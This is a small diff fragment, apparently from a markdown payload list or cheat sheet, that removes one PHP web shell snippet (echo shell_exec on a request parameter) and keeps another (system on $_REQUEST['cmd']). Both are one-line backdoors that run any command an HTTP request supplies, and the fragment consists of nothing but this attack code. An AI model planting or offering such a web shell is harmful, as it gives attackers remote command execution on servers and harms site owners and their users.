@@ -6,13 +6,6 @@
 
 ```php
 <?php
-	echo shell_exec($_REQUEST['cmd']);
-?>
-```
-ó
-
-```php
-<?php
       system($_REQUEST['cmd']);
 ?>
 ```
